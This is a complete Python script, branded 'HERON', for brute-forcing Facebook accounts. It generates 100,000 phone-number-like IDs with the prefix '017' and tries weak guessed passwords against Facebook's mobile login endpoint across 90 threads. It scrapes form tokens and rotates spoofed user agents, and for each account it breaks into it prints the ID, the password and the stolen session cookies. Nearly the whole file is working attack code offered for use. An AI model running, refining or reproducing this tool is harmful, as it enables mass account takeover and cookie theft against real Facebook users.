import os,re,sys,uuid,random,requests,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool


def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

loop=0
oks=[]

#----------CK Update----------#

agent="Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36"
#-----GRAPH




#---HOST
fb="m"
#----------CK Update----------#






def main():
    user=[]
    
    code="017"
    for i in range(100000):
        gg=str(random.choice(range(10000000,99999999)))
        user.append(gg)
    with ThreadPool(max_workers=90) as update:
        
        for xd in user:
            uid=code+xd
            pwx=[xd,xd[2:]]
            update.submit(host,uid,pwx)






def host(uid,pwx):
    global oks,loop,fb
    session=requests.Session()
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[HERON]   {loop}⟩100000 \x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            uax=windows()
            had={
'Host': f'{fb}.facebook.com',
'content-length': '1640',
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': uax,
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVreZWR72Tc',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': f'https://{fb}.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_0e8HatvwFQ9PX3jwD&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br,',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            url=f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url,data=info,headers=had)
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15]
                print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
                
                break
            elif "checkpoint" in heron_brand:
                break 
                #print(f"\r\r[green] [CP-ID] {uid} | {ps}")
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(30)



main()




























